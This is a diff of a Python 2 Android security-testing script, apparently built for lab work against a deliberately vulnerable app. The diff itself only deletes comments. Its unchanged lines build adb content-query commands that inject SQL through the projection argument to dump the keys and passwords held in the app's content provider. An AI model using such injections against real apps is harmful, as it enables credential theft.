@@ -205,18 +205,16 @@ file containing the intents:  "))
             if not packages:
                 print_menu()
             else:
-		#get all contents providers
                 contents=get_apks(devices_list, packages.strip())
                 print contents 
                 select_key="'* FROM Key;--'"
                 select_pass="'quote(password) FROM Passwords;--'"
                 command_get_key="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_key; 
                 command_get_pass="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_pass; 
-		#get keys
                 print command_get_key
                 print "KEY and User  ";
                 print run_inadb(devices_list[0], command_get_key)
-                #get password
+                
                 print command_get_pass
                 print "Passowords  ";
                 print run_inadb(devices_list[0], command_get_pass)
@@ -236,7 +234,7 @@ file containing the intents:  "))
                     print "*ERROR* unavailable devices"
                     loop = False
                     continue
-		#put seed folder on device
+
                 copy_file_command='push ' + seed_folder +' /data/local/test/'
                 print copy_file_command
                 print run_inadb(devices_list[0], copy_file_command)
